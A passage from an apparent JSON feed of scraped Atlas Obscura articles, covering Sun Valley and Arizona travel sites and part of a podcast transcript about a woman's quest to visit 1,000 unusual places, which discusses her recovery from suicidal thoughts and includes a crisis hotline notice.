Originally called the Commercial Club, the gambling hub closed its doors after just a few years, and the American Legion turned it into a meeting hall. For a short time, the facility also served as a dry goods store until, in 1950, a man named Whitey Hirschman, turned it back into a casino. Containing decades of local lore and history, the saloon won a 2025 James Beard America's Classics Award. Today, the menu consists of hearty steaks, prime rib, ribs, and seafood, including Idaho trout. Order the signature “Jim Spud,” and you’ll get a hot baked potato with teriyaki beef, cheese, and other toppings. There’s even a “Hemingway Margarita” that pays homage to the famed author whose final resting place is in Sun Valley. Amid the rustic décor inside, you’ll find antiques and artifacts, including Hemingway’s hunting rifle, Western posters and artwork, a Native American canoe and arrowheads, and more.</p>\n<h2 class=\"article-subheading-pre-rd\" style=\"text-align: left;\"><strong>Ernest Hemingway’s Grave</strong></h2>\n<figure class=\" contains-caption \"><img alt=\"article-image\" class=\"article-image with-structured-caption \" src=\"https://assets.atlasobscura.com/article_images/106288/image.jpg\" width=\"auto\" /></figure>\n<p>Despite Ernest Hemingway’s flamboyant, hard-living nature, the <a href=\"https://www.atlasobscura.com/places/ernest-hemingway-s-grave\">famed writer’s final resting place</a> is a simple slab in a Sun Valley cemetery. Known for his heavy drinking, hunting, and womanizing lifestyle, Hemingway lived all over, from Spain and Cuba to Florida, penning works like, “The Sun Also Rises,” “For Whom the Bell Tolls,” and the Pulitzer Prize-awarded “The Old Man and the Sea.” He visited central Idaho many times before moving to the area prior to his death in 1961. Placed alongside his wife, Mary, under two towering spruce trees, the grave is a modest rectangular marker including just the writer’s name and dates of birth and death. In addition to the expected flowers, fans also pay respects by leaving behind booze bottles, coins, matches, and pens.</p>\n<h2 class=\"article-subheading-pre-rd\" style=\"text-align: left;\"><strong>Sawtooth Botanical Garden</strong></h2>\n<figure class=\" contains-caption \"><img alt=\"article-image\" class=\"article-image with-structured-caption \" src=\"https://assets.atlasobscura.com/article_images/106297/image.jpg\" width=\"auto\" /></figure>\n<p>For a serene escape, head to the <a href=\"https://visitsunvalley.com/services/sawtooth-botanical-garden\">Sawtooth Botanical Garden</a> in Ketchum. Located on five acres, the garden, which is also an educational non profit, centers on five major display gardens that represent the varied biomes in central Idaho. One must-see feature is the colorful Tibetan prayer wheel in the Garden of Infinite Compassion. It’s the only such wheel commissioned and blessed by the Dalai Lama in North America and the only one powered by flowing water. The 1,100-pound wheel is said to symbolize peace, healing and the dissemination prayers when turned.</p>\n<h2 class=\"article-subheading-pre-rd\" style=\"text-align: left;\"><strong>Wood River Museum of History &amp; Culture</strong></h2>\n<figure class=\" contains-caption \"><img alt=\"article-image\" class=\"article-image with-structured-caption \" src=\"https://assets.atlasobscura.com/article_images/106283/image.jpg\" width=\"auto\" /></figure>\n<p>This free cultural museum in downtown Ketchum celebrates the rich and varied history of central Idaho, from its native people and immigrants to the iconic Bald Mountain and its effect on the local landscape. One exhibit at the <a href=\"https://visitsunvalley.com/to-do/wood-river-museum-of-history-and-culture/\">Wood River Museum</a>, “A Writer in the New Country: Hemingway in 1939,” highlights Ernest Hemingway’s first trip to Sun Valley, a place that was dear to the writer up until his death in 1961. Sheep shears, a telegraph key, and vintage skis are all part of the interactive Cabinet of Wonders, which houses important regional artifacts. At the museum’s entrance, another exhibit honors the Shoshone-Bannock native peoples, who first inhabited central Idaho.</p>\n<h2 class=\"article-subheading-pre-rd\" style=\"text-align: left;\"><strong>Ore Wagon Museum</strong></h2>\n<figure class=\" contains-caption \"><img alt=\"article-image\" class=\"article-image with-structured-caption \" src=\"https://assets.atlasobscura.com/article_images/106298/image.jpg\" width=\"auto\" /></figure>\n<p>This <a href=\"https://visitsunvalley.com/events/ore-wagon-museum/\">history museum in Ketchum</a> highlights the importance of ore wagons during the region’s rich mining boom of the 1880s. These sturdy wagons, donated to the museum by the Lewis family, whose Fast Freight Line was integral in transporting silver ore from remote mines to in-town railheads, are reportedly the only of their kind in existence. In honor of its mining roots, the city hosts a heritage festival, Wagon Days, every Labor Day weekend. The beloved event features live music, food vendors, cultural presentations, and culminates with the Big Hitch, a parade of these historic, non-motorized vehicles that served as the backbone of the region’s economy before the development of the railroads.</p>",
        "source": "www.atlasobscura.com",
        "published": "Mon, 26 Jan 2026 14:00:00 -0500",
        "fetched_at": "2026-02-09T23:34:22.475506Z",
        "tags": [
          {
            "name": "transformation",
            "score": 3
          },
          {
            "name": "boundary_crossing",
            "score": 9
          },
          {
            "name": "scale_shift",
            "score": 4
          }
        ],
        "structural_score": 16,
        "timeliness_score": 3,
        "final_score": 9.5,
        "reddit_score": null,
        "reddit_comments": null
      },
      {
        "url": "https://www.atlasobscura.com/articles/arizona-guide",
        "title": "Discover Arizona’s Majesty",
        "summary": "<p>Arizona is wild in its environmental diversity, boasting five of the six distinct types of ecological biomes. Tundra, forest, woodland, scrub, grassland, and desert biomes are spread across the state, with four deserts, over 210 named mountain ranges, a biblical-scale monsoon season—and, of course, the Grand Canyon. The Sonoran Desert, which stretches across much of the state’s southern half, is a “lush desert,” meaning that it receives rain twice a year, and thus features a visually stunning blend of sepia tones and deep green vegetation.</p>\n<p>The state’s rich culture reflects the diversity of its Native populations and the many who have migrated to the area, along with a strong connection to Mexican cultural heritage. The region is the ancestral and current home to twenty-two federally recognized Native American tribes, including Diné (Navajo Nation) and the Tohono O'odham Nation.</p>\n<h3>Northern Region: Flagstaff and Holbrook</h3>\n<div class=\"flip-card\">\n<div class=\"flip-card-inner\">\n<div class=\"flip-card-front\"><img alt=\"Rainbow Forest\" src=\"https://atlas-dev.s3.amazonaws.com/uploads/assets/3d9f05e0-b5c9-4e76-b602-b0ba966c55661bc89aed0ef0a7e6e3_Wood%20and%20rock%20converge%20in%20the%20Rainbow%20Forest,%20where%20nothing%20is%20exactly%20as%20it%20seems.jpg\" /></div>\n<div class=\"flip-card-back\">\n<h3>Behold Arizona’s Sublime Beauty</h3>\n<p>The Rainbow Forest includes the largest and most colorful displays of petrified wood in Petrified Forest National Park.</p>\n</div>\n</div>\n<div class=\"flip-card-instructions\">Tap/hover to learn more!</div>\n</div>\n<p>Ancient geology and celestial discovery converge in Northern Arizona, inviting travelers to reflect on humanity’s place between the stars above and the eons below. Many visitors come for the Grand Canyon, but Northern Arizona contains multitudes. The high-elevation region features rugged mountain ranges, the state’s highest peak, and four distinct seasons, making it a destination for winter sports, mountaineering, and astronomy. The charming city of Flagstaff serves as home base to Northern Arizona University, the regional destination ski resort Snowbowl, and the Flagstaff Mountain Film Festival.</p>\n<figure class=\" contains-caption \"><img alt=\"article-image\" class=\"article-image with-structured-caption \" src=\"https://assets.atlasobscura.com/article_images/106241/image.jpg\" width=\"auto\" /></figure>\n<h3 class=\"article-second-subheading-pre-rd\"><a href=\"https://www.atlasobscura.com/places/lowell-observatory\">Lowell Observatory</a></h3>\n<p>Stargazers flock to Lowell Observatory, a world-class astronomy destination on the edge of Flagstaff. The site has been in continuous operation since the late 1800s, when it was established by Percival Lowell, a financier and astronomer who became obsessed with the possibility of life on Mars. Lowell had the means to fund his fascinations, and thus Lowell Observatory was built, with Northern Arizona selected as its site for its high elevation and dark skies. Pluto was discovered here, and the city’s commitment was recognized in 2001, when Flagstaff became the first International Dark Sky City.</p>\n<figure class=\" contains-caption \"><img alt=\"article-image\" class=\"article-image with-structured-caption \" src=\"https://assets.atlasobscura.com/article_images/106242/image.jpg\" width=\"auto\" /></figure>\n<h3 class=\"article-second-subheading-pre-rd\"><a href=\"http://www2.lowell.edu/users/elgb/observing_site.html\">Mars Hill and Anderson Mesa</a></h3>\n<p>Just west of Flagstaff proper sits Mars Hill, part of Lowell Observatory’s campus and the site of the apocryphal origin story of the theory of dark matter. As you drive up the hill, spot the iconic dome of the Clark Refractor, a telescope dating back to the 1800s. Continue your astronomy tour by heading southeast to spot Anderson Mesa, a flattop plateau in Coconino County that hosts Anderson Mesa Station, a dark-sky astronomical observatory.</p>\n<figure class=\" contains-caption \"><img alt=\"article-image\" class=\"article-image with-structured-caption \" src=\"https://assets.atlasobscura.com/article_images/106243/image.jpg\" width=\"auto\" /></figure>\n<h3 class=\"article-second-subheading-pre-rd\"><a href=\"https://www.atlasobscura.com/places/petrified-forest-national-park\">Petrified Forest National Park</a></h3>\n<p>Is it rock? Is it wood? The answer is yes at Petrified Forest National Park, where hundreds of millions of years of the organic process of permineralization have turned what was once a forest of trees into a wavy psychedelic desert landscape laden with fossils. These artifacts of the Triassic period (the era when dinosaurs are thought to have first appeared) include compression fossils of leaves, seeds, insects, and fish as well as scattered petrified logs.</p>\n<p> </p>\n<figure class=\" contains-caption \"><img alt=\"article-image\" class=\"article-image with-structured-caption \" src=\"https://assets.atlasobscura.com/article_images/106244/image.jpg\" width=\"auto\" /></figure>\n<h3 class=\"article-second-subheading-pre-rd\"><a href=\"https://www.nps.gov/articles/850116.htm#6/27.450/-89.143\">Rainbow Forest</a></h3>\n<p>Nestled within Petrified Forest National Park, the Rainbow Forest features huge, vibrant rocks in deep reds, yellows, blues, and purples. The rocks began life as trees, petrified over hundreds of millions of years, and draw their vivid hues from minerals like manganese, iron oxide, quartz, and hematite. Pop into the Rainbow Forest Museum to learn about the geological and cultural history of the land, which is the historic home of the Ancestral Puebloan people.</p>\n<p> </p>\n<figure class=\" contains-caption \"><img alt=\"article-image\" class=\"article-image with-structured-caption \" src=\"https://assets.atlasobscura.com/article_images/106245/image.jpg\" width=\"auto\" /></figure>\n<h3 class=\"article-second-subheading-pre-rd\"><a href=\"https://www.visitarizona.com/places/parks-monuments/painted-desert\">Painted Desert</a></h3>\n<p>Before you leave Petrified Forest National Park, head to the park’s north side to visit the Painted Desert, another region of the park with unique geological characteristics. Here, find badlands with distinctly visible layers—looking like they were painted with a steady hand. These layers are the result of stratification of shale, mudstone, and siltstone, each of which carry a distinctive pigment.</p>\n<h3>Central Region: Clarkdale, Camp Verde, and Jerome</h3>\n<div class=\"flip-card\">\n<div class=\"flip-card-inner\">\n<div class=\"flip-card-front\"><img alt=\"Montezuma Castle National Monument\" src=\"https://atlas-dev.s3.amazonaws.com/uploads/assets/c6c0b689-49fc-4ef9-9f08-85c4686f34528819d03b04ca73676d__High%20rise%20apartment_%20takes%20on%20new%20meaning%20at%20Montezuma%20Castle.jpg\" /></div>\n<div class=\"flip-card-back\">\n<h3>Explore Vibrant Arts, Culture, and Experiences</h3>\n<p>Evidence suggests the construction at Montezuma Castle National Monument began in the 1100s. It was occupied until as late as 1395.</p>\n</div>\n</div>\n<div class=\"flip-card-instructions\">Tap/hover to learn more!</div>\n</div>\n<p>In Central Arizona, Saguaros stand watch over canyons and copper towns, linking ancient ingenuity, industrial ambition, and enduring cultural roots. The region features the sprawling state capital city of Phoenix, but the whole area is rich with Indigenous culture as well as niche historic sites dedicated to preserving the stories of the Wild West. Copper mining was and is a significant industry in the region, and the remnants of the extraction business are conserved in installations like the town of Jerome’s Mine Museum.</p>\n<figure class=\" contains-caption \"><img alt=\"article-image\" class=\"article-image with-structured-caption \" src=\"https://assets.atlasobscura.com/article_images/106246/image.jpg\" width=\"auto\" /></figure>\n<h3 class=\"article-second-subheading-pre-rd\"><a href=\"https://www.atlasobscura.com/places/verde-canyon-railroad\">Verde Canyon Railroad</a></h3>\n<p>The Verde Canyon Railroad, a quirky heritage railroad that runs 20 miles from Clarkdale to Perkinsville, features a vintage diesel locomotive powers that this sightseeing excursion, bringing riders through the vibrant wilderness landscape. In the canyon, keep your eyes peeled for the bald eagles who frequent the area.</p>\n<figure class=\" contains-caption \"><img alt=\"article-image\" class=\"article-image with-structured-caption \" src=\"https://assets.atlasobscura.com/article_images/106247/image.jpg\" width=\"auto\" /></figure>\n<h3 class=\"article-second-subheading-pre-rd\"><a href=\"https://historicbridges.org/b_h_fipsm.php?bsearch=04025\">Perkinsville Trestle</a></h3>\n<p>As you ride the Verde Canyon Railroad, you’ll pass over a series of gorges formed by the Verde River. These steep valleys are spanned by metal trestles—making for extraordinary vistas from the open-air viewing cars. When your rail car traverses the Perkinsville Trestle, the tracks, directly underneath the car, are obscured to riders, creating the feeling that the railroad has taken flight.</p>\n<figure class=\" contains-caption \"><img alt=\"article-image\" class=\"article-image with-structured-caption \" src=\"https://assets.atlasobscura.com/article_images/106248/image.jpg\" width=\"auto\" /></figure>\n<h3 class=\"article-second-subheading-pre-rd\"><a href=\"https://www.arizonacopperartmuseum.com\">Arizona Copper Art Museum</a></h3>\n<p>The deposits of copper embedded in Arizona’s earth have enticed miners since Native people harvested ore to make tools and jewelry. Since the early 1900s, industrial mining has pulled copper from the land. The former mining town Clarkdale is home to the Arizona Copper Art Museum, which stands as a testament to the creative uses of the mineral. On a visit, check out the distillery room, where you’ll find elaborate copper vessel systems for winemaking.</p>\n<p> </p>\n<figure class=\" contains-caption \"><img alt=\"article-image\" class=\"article-image with-structured-caption \" src=\"https://assets.atlasobscura.com/article_images/106249/image.jpg\" width=\"auto\" /></figure>\n<h3 class=\"article-second-subheading-pre-rd\"><a href=\"https://www.atlasobscura.com/places/montezuma-castle-national-monument\">Montezuma Castle National Monument</a></h3>\n<p>Pull off the highway in Camp Verde to stop by Montezuma Castle National Monument, a historic site that honors and preserves the prehistoric cliff dwelling architecture of the Indigenous Sinagua people. Built into a limestone cliff is a multi-level 20-room dwelling that is noted as one of the best-preserved examples of pre-contact architecture.</p>\n<h3 class=\"article-second-subheading-pre-rd\"><a href=\"https://www.nps.gov/moca/planyourvisit/exploring-montezuma-well.htm\">Montezuma Well</a></h3>\n<p>Within Montezuma Castle National Monument lies a giant hole: Montezuma Well. Nearly 400 feet from shore to shore, the “well” is in fact a huge, naturally occurring spring-fed limestone sinkhole full of carbonated, arsenic-laden water. The well serves as home to five species of fauna that exist nowhere else in the world, including the water scorpion.</p>\n<p> </p>\n<figure class=\" contains-caption \"><img alt=\"article-image\" class=\"article-image with-structured-caption \" src=\"https://assets.atlasobscura.com/article_images/106250/image.jpg\" width=\"auto\" /></figure>\n<h3 class=\"article-second-subheading-pre-rd\"><a href=\"https://www.atlasobscura.com/places/jeromes-sliding-jail\">Jerome’s Sliding Jail</a></h3>\n<p>In Jerome (population 464), the main attraction is a small jail structure that was erected in the early 1900s on the slope of a mountain. Dynamite from nearby mines caused the jail to literally slide down the hill until finding stasis on the main thoroughfare. Now a visitor’s attraction, the jail harks back to the days of the Wild West, when hard-drinking rabble-rousers would sleep it off within the cell’s walls.</p>\n<h3>Southern Region: Bisbee, Tubac, and Patagonia</h3>\n<div class=\"flip-card\">\n<div class=\"flip-card-inner\">\n<div class=\"flip-card-front\"><img alt=\"Pronghorn Antelope in the Buenos Aires National Wildlife Refuge\" src=\"https://atlas-dev.s3.amazonaws.com/uploads/assets/f5d06809-5120-43bc-820f-df69590282a120d65582e662de3d08_usfws-pronghorn-buenos-aires-natinal-wildlife-refuge.jpg\" /></div>\n<div class=\"flip-card-back\">\n<h3>Experience Arizona’s Welcoming Warmth and Ties to Nature</h3>\n<p>The Buenos Aires National Wildlife Refuge is home to hundreds of species, including the pronghorn antelope, mule deer, and puma.</p>\n</div>\n</div>\n<div class=\"flip-card-instructions\">Tap/hover to learn more!</div>\n</div>\n<p>Where wild canyons bloom and hummingbirds hover, artists, dreamers, and makers create in harmony with the desert’s vivid, living canvas. Known for its miles of Saguaro cacti, Southern Arizona is home to a large swath of the Sonoran Desert, about 370 miles of the U.S.-Mexico border, and the city of Tucson.</p>\n<p>The Sonoran Desert is home to a diversity of flora and fauna, including prickly pear, Gila monsters, roadrunners, and the western diamondback rattlesnake. For more sedate engagements with local culture, Tucson is a dining hotspot: a UNESCO City of Gastronomy, a designation awarded to sites of global culinary significance.</p>\n<figure class=\" contains-caption \"><img alt=\"article-image\" class=\"article-image with-structured-caption \" src=\"https://assets.atlasobscura.com/article_images/106251/image.jpg\" width=\"auto\" /></figure>\n<h3 class=\"article-second-subheading-pre-rd\"><a href=\"https://www.bisbeebreakfastclub.com\">Bisbee Breakfast Club</a></h3>\n<p>Bisbee Breakfast Club locations can be spotted across Southern Arizona, but Bisbee is the home of the original. Within the nondescript beige building, the charmingly weathered interior is classic American diner with a Southwestern twist. Nosh on regional Mexican favorites like huevos rancheros and fan-fave house specialties like the Copper Queen Skillet, a mashup of eggs, potatoes, and seemingly every kind of breakfast meat: bacon, ham, sausage, and spicy sausage gravy.</p>\n<h3 class=\"article-second-subheading-pre-rd\"><a href=\"http://www.oldbisbeebrewingcompany.com\">Old Bisbee Brewing Co.</a></h3>\n<p>For a bite and a brew in the kitschy town, the Old Bisbee Brewing Co. offers an eclectic and sophisticated menu of draft beers, brewed on-site. Strict IPA buffs will appreciate the heady Double Hopped IPA, while those with more experimental tastes may delight in the Mayan Stout, brewed using a heritage Mesoamerican bean.</p>\n<figure class=\" contains-caption \"><img alt=\"article-image\" class=\"article-image with-structured-caption \" src=\"https://assets.atlasobscura.com/article_images/106252/image.jpg\" width=\"auto\" /></figure>\n<h3 class=\"article-second-subheading-pre-rd\"><a href=\"https://www.tubacarts.org\">Tubac Center for the Arts</a></h3>\n<p>Luxe meets rustic at Tubac, an arts and leisure complex tucked between the Tumacácori and Santa Rita mountains. Find the ritzy side at Tubac Golf Resort &amp; Spa, where golfers flock to the 27-hole course and spa-goers indulge, but the arts and the grounds are the real draw. Explore Tubac to find four galleries, a performance space, and arts library, plus a trail system that connects with the Juan Bautista de Anza National Historic Trail.</p>\n<figure class=\" contains-caption \"><img alt=\"article-image\" class=\"article-image with-structured-caption \" src=\"https://assets.atlasobscura.com/article_images/106253/image.jpg\" width=\"auto\" /></figure>\n<h3 class=\"article-second-subheading-pre-rd\"><a href=\"https://www.fws.gov/refuge/buenos-aires\">Buenos Aires National Wildlife Refuge</a></h3>\n<p>Near the border town of Sasabe, 117,000 acres of public grassland desert serves as an ecological reserve. Habitat restoration makes the refuge a safe haven for 50+ mammal species, with the land sheltering endangered species including the masked bobwhite quail. Find an open-access trail system as well as guided hikes, and complimentary public-access campsites. Keep your eyes peeled for deer, javelina, coyotes, skunks, rabbits—even the occasional jaguar.</p>\n<figure class=\" contains-caption \"><img alt=\"article-image\" class=\"article-image with-structured-caption \" src=\"https://assets.atlasobscura.com/article_images/106254/image.jpg\" width=\"auto\" /></figure>\n<h3 class=\"article-second-subheading-pre-rd\"><a href=\"https://tucsonbirds.org/paton-center/\">Paton Center for Hummingbirds</a></h3>\n<p>Patagonia’s Paton Center for Hummingbirds is a conservation space for more than 250 bird species, including the rare violet-crowned hummingbird. The 1.4-acre woodland site began its life as the yard of a pair of local birdwatchers, who in the 1970s began inviting others to join them in marveling at the tiny avian pollinators. From there, the local Audubon Society acquired the property, which is lovingly managed as an oasis for birds and birders alike.</p>\n<figure class=\" contains-caption \"><img alt=\"article-image\" class=\"article-image with-structured-caption \" src=\"https://assets.atlasobscura.com/article_images/106255/image.jpg\" width=\"auto\" /></figure>\n<h3 class=\"article-second-subheading-pre-rd\"><a href=\"https://www.nps.gov/chir/index.htm\">Chiricahua National Monument</a></h3>\n<p>Find rocks on rocks on rocks at Chiricahua National Monument, where physics-defying rock stacks give an otherworldly feel to the ecological environs. The result of a historical volcanic event, the area’s rock formations (officially known as hoodoos and rhyolite pinnacles) look like blocks stacked by the hands of giants. Travelers can take in their weird splendor from 17 miles of maintained trails and campground facilities.</p>",
        "source": "www.atlasobscura.com",
        "published": "Mon, 29 Dec 2025 09:57:00 -0500",
        "fetched_at": "2026-02-09T23:34:22.475536Z",
        "tags": [
          {
            "name": "boundary_crossing",
            "score": 6
          },
          {
            "name": "visibility_gain",
            "score": 5
          },
          {
            "name": "scale_shift",
            "score": 5
          }
        ],
        "structural_score": 16,
        "timeliness_score": 3,
        "final_score": 9.5,
        "reddit_score": null,
        "reddit_comments": null
      },
      {
        "url": "https://www.atlasobscura.com/articles/podcast-caroline-mazel-carlton-1000-places",
        "title": "The Quest to Visit 1,000 Places",
        "summary": "<div>\n<p class=\"item-body-text-graf\"><strong>Listen and subscribe on <a href=\"https://podcasts.apple.com/us/podcast/the-atlas-obscura-podcast/id1555769970\">Apple Podcasts</a>, <a href=\"https://open.spotify.com/show/0s0c4Z99PwbW8efTmHckyT\">Spotify</a>, and all major podcast apps.</strong></p>\n</div>\n<hr class=\"baseline-grid-hr\" />\n<p>I’m Kelly McEvers, and this is Atlas Obscura, a celebration of the world’s strange, incredible, and wondrous places.</p>\n<p>So I don’t know about you, but I like to keep track of all the places that I have visited, say, in the past year. I have lists of all the countries that I visit in a given region. Each year I go back to my handwritten calendar planner book because, yes, I still write everything down.</p>\n<p>I have kept track of all my trips, and that helps me remember all the places I’ve visited and the people I saw. Most people I know are, of course, more advanced than this. They actually keep digital records like lists of restaurants where they want to go or Google Maps with pins on places.</p>\n<p>In case you have somehow stumbled upon this podcast and you don’t know too much about Atlas Obscura, we actually have a map, an Atlas, filled with thousands upon thousands of unusual places across the globe. Each place is submitted by a person, and it is a fun tool to use whether you are on vacation or you want to get to know your own hometown better.</p>\n<p>My guest today has visited over 1,000 of these places. Her name is Caroline Mazel-Carlton, and she has been working toward that goal for more than 10 years. This project, Visiting 1,000 places, was about more than just taking items off the list. She says it helped save her life.</p>\n<p>Caroline, welcome.</p>\n<p><em>This is an edited transcript of the </em><a href=\"https://www.atlasobscura.com/podcast\"><em>Atlas Obscura Podcast</em></a><em>: a celebration of the world’s strange, incredible, and wondrous places. Find the show on </em><a href=\"https://go.skimresources.com/?id=89027X1542228&amp;isjs=1&amp;jv=15.7.1&amp;sref=https%3A%2F%2Fwww.atlasobscura.com%2Farticles%2Fpodcast-montezuma-well&amp;url=https%3A%2F%2Fpodcasts.apple.com%2Fus%2Fpodcast%2Fthe-atlas-obscura-podcast%2Fid1555769970&amp;xs=1&amp;xtz=300&amp;xuuid=f238828fc9c8f1386593b6f8b1d81e7b&amp;xjsf=other_click__contextmenu%20%5B2%5D\"><em>Apple Podcasts</em></a><em>, </em><a href=\"https://open.spotify.com/show/0s0c4Z99PwbW8efTmHckyT\"><em>Spotify</em></a><em>, and all major podcast apps. </em><em>This episode contains discussions of suicidal thoughts. If you or someone you know is struggling, contact the Suicide Crisis Hotline by calling or texting 988.</em></p>\n<figure class=\" contains-caption \"><img alt=\"article-image\" class=\"article-image with-structured-caption \" src=\"https://assets.atlasobscura.com/article_images/106271/image.jpg\" width=\"auto\" /></figure>\n<p><strong>Caroline Mazel-Carlton: </strong>Oh, I’m getting teary already. It’s so good to be here. Thank you, Kelly.</p>\n<p><strong>Kelly McEvers: </strong>Yeah, welcome. So talk about your first ever visit to an Atlas Obscura place.</p>\n<p><strong>Caroline Mazel-Carlton: </strong>Yeah. So one of the first times that I remember using the Atlas Obscura was when I wanted to take my now-husband on a romantic interlude, like a nice weekend away. And so I was looking for spots—bed and breakfasts—and the Atlas Obscura was so helpful because it showed me that not too far away in Fall River, Massachusetts, you can find <a href=\"https://www.atlasobscura.com/places/lizzie-borden-bed-and-breakfast-and-museum\">Lizzie Borden’s house</a>.</p>\n<p><strong>Kelly: </strong>In case you’re not familiar, in 1892, Lizzie Borden allegedly murdered her parents, Abby and Andrew Borden, in their house with an axe. Lizzie was acquitted. And Caroline believes she was innocent. But the whole thing has become a bit of a folk story.</p>\n<p>And the house where the murders took place still stands now as this untraditional bed and breakfast.</p>\n<p><strong>Caroline: </strong>They had this whole getaway that you could have and sleep in Lizzie Borden’s house. They had dummies set up, sort of positioned where, Andrew Borden, what he would have looked like after the crime had been committed. So it was this beautiful Victorian house full of wonderful <a href=\"https://www.atlasobscura.com/places/leilas-hair-museum\">Victorian hair art</a>, which I’m a big fan of Victorian hair art as well—some great specimens of that there. So it was just an amazing experience.</p>\n<p><strong>Kelly: </strong>And I would imagine that your now husband was into it?</p>\n<p><strong>Caroline: </strong>Oh, yeah, yeah. It was sort of like a litmus test in a way.</p>\n<p><strong>Kelly: </strong>I was going to say, if he passed that, then he knew he was a keeper.</p>\n<p><strong>Caroline: </strong>There’s a beautiful picture of us taken where we were sitting on this like Victorian couch and we have the dummy representing Andrew Borden’s bloody corpse splayed out across our laps. And we’re just brimming with young love. And it’s such a beautiful photograph.</p>\n<p><strong>Kelly: </strong>Yeah. I love it. You’re like, this is the one for me.</p>\n<p><strong>Caroline: </strong>Absolutely. And I did try, when we got married, I tried to convince my mom to let me use that photo for our save the date. But she said, “No, I’m not into the idea of this bloody corpse photo.” So we ended up using a picture from another trip we took to Paris.</p>\n<p><strong>Kelly: </strong>Nice. And I would love to just know where your urge to go places started. What was one of your most memorable trips you took as a kid?</p>\n<p><strong>Caroline: </strong>So my family growing up, we weren’t the type of family that went to the same beach or the same lake house every year for vacation. One of my family mottos was, “We’ll go anywhere once.”</p>\n<p><strong>Kelly: </strong>Oh, I love that.</p>\n<p><strong>Caroline: </strong>And so my dad has always been a history buff, but he’s never shied away from the weirder and grittier parts of American history. Some of my early memories are definitely wandering around graveyards.</p>\n<p>I remember seeing the <a href=\"https://www.atlasobscura.com/places/the-skin-of-little-sorrel-lexington-virginia\">taxidermied horse</a> of Stonewall Jackson in some weird museum in Virginia. One place we went, and sadly, you can’t go here anymore. My dad has sort of, like, a dark streak, like, dark humor.</p>\n<p>And he became obsessed with the <a href=\"https://www.atlasobscura.com/articles/31-days-of-halloween-floyd-collins\">story of this guy named Floyd Collins</a>, who was a cave explorer that actually got trapped and died in the Mammoth Cave system. So my dad and I actually did some caving together and visited the museum that honors this man. A tribute to explorers everywhere, but sadly he did not make it out of the cave.</p>\n<p><strong>Kelly: </strong>Mm-hmm. You actually set this goal of trying to visit 1,000 Atlas Obscura places over a decade ago in 2012. And for so many people, you know, travel and seeing the world, there’s all these reasons we do it, but a lot of it is like: I want a change in perspective, or I want to learn more about this culture. I want to be wowed.</p>\n<p>For you, it sounds like there was a really kind of specific reason that you did this. Can you take us back to that time and talk about what was going on in your life?</p>\n<p><strong>Caroline: </strong>So for me, I grew up experiencing a lot of bullying over how I looked or the way that I acted. And I started to struggle a lot with thoughts of suicide. And in fact, for certain parts of my life I was hospitalized and was in treatment programs where you’re not allowed to leave places like that. So it’s kind of a smaller existence.</p>\n<p>For me, it was always trying to figure out, how do I survive? How do I find a way to exist in this world? And what I realized is, for a lot of us that grapple with suicidal thoughts, it’s not truly that we want to literally die, but that the life that we’re living needs to end. It’s sort of this desire to be transformed in a way.</p>\n<p>For me, trying to figure out how to exist in the world has always been a bit of a battle in and of itself. And I remember one time seeing a book on my uncle. My uncle Doug also loved to travel the world. And he had a book called <em>1,000 Places to See Before You Die.</em></p>\n<p><strong>Kelly: </strong>Okay.</p>\n<p><strong>Caroline: </strong>And I thought about that. And I thought about the power of saying to myself, you know what? You can’t die today because there’s still places that you haven’t seen yet. So I used that book for a while, but then when I discovered Atlas Obscura, I was like, these sites are actually more interesting to me.</p>\n<p>They’re more accessible. They’re weirder. As I visit Atlas Obscura sites, I often learn about weird people like myself. I’ve seen amazing outsider art. So reaching a thousand Atlas Obscura sites before I died became really, really important to me.</p>\n<p><strong>Kelly: </strong>Since then, Caroline has visited Atlas Obscura places around the world, from the <a href=\"https://www.atlasobscura.com/places/grave-of-johnny-appleseed\">grave of Johnny Appleseed</a> in Fort Wayne, Indiana, to a <a href=\"https://www.atlasobscura.com/places/shree-ganesh-darshan-museum\">temple complex</a> in Pune, India, with 500 statues of Lord Ganesh. Once, on a 16-hour layover in Hong Kong, she left the airport and took a tram over the mountains to see the world's <a href=\"https://www.atlasobscura.com/places/tian-tan-buddha\">largest-seated bronze Buddha.</a></p>\n<p>She’s been to the <a href=\"https://www.atlasobscura.com/places/icelandic-phallological-museum\">Icelandic Phallological Museum</a> in Reykjavik and the <a href=\"https://www.atlasobscura.com/places/worlds-largest-czech-egg\">world’s largest Czech egg</a> in Wilson, Kansas, and <a href=\"https://www.atlasobscura.com/places/deyrolle-taxidermy\">a taxidermy shop in Paris</a> that Pablo Picasso and Salvador Dali would visit for inspiration. Taxidermy holds a special place in Caroline’s heart.</p>\n<p><strong>Caroline: </strong>There’s one Atlas Obscura site I’m going to give a shout out to, <a href=\"https://www.atlasobscura.com/places/oles-big-game-steakhouse-and-lounge\">Ole’s Big Game Steakhouse in Nebraska</a>, where you can be surrounded by taxidermy and also you can eat at the same time.</p>\n<p><strong>Kelly: </strong>Which, not going to lie, doesn’t sound great to some people, but I love it.</p>\n<p>Today, Caroline works in suicide prevention. with an organization that does peer support, advocacy, and training for harm reduction. And she brought her 1,000 places goal into that work.</p>\n<p>Caroline has led trainings around the world, and sometimes on these trips, she and her colleagues will visit Atlas Obscura sites together. Caroline says it is really hard to choose a favorite memory.</p>\n<p><strong>Caroline: </strong>Oh, there are so many. I remember one time we were doing an alternatives to suicide training and we were in Tacoma, Washington, and we actually found on Atlas Obscura the grave of Kurt Cobain, who was someone that I looked up to when I was younger, one of my favorite musicians, and who did die by suicide.</p>\n<p>But we went there together and it felt like such a special place to be there and honor him and his role in our lives and the way he could give voice to pain in a way that other people could connect with. I also remember a time where I was giving a talk at The Hague in the Netherlands and we visited a museum.</p>\n<p>I think it’s called Museum of the Mind, which had been a psychiatric hospital. But then they filled it with art, beautiful art made from former psychiatric patients. So going there and to some of the Van Gogh sites. And it’s just been incredible to do that with some of my colleagues who’ve also struggled with thoughts of suicide.</p>\n<p>And I really look at this achievement of reaching a thousand sites as something that we did together. And it felt really special because it was all connected to the journey of healing and embracing our weirdness and our desire to live in a world that’s not always, you know, normative.</p>\n<p><strong>Kelly: </strong>So, I mean, you hit the goal, right? You’re over 1,000. You’re at 1,048, to be exact. So what’s next? I mean, how do you, you know, where do you go from there? Do you set a new goal? Are you just going to keep on keeping on at this point? Do you feel like you’re going to travel differently now?</p>\n<p><strong>Caroline: </strong>Yeah. Well, after meeting the goal, I was like, I can rest a little bit because I honestly thought I’m 43. So I thought I would be at least 50 before I hit 1,000. but I hit it much more quickly than I thought I would. But the thing about Atlas Obscura is there’s always more you can do.</p>\n<p>And one of the things that I really encourage everyone listening to do is to add 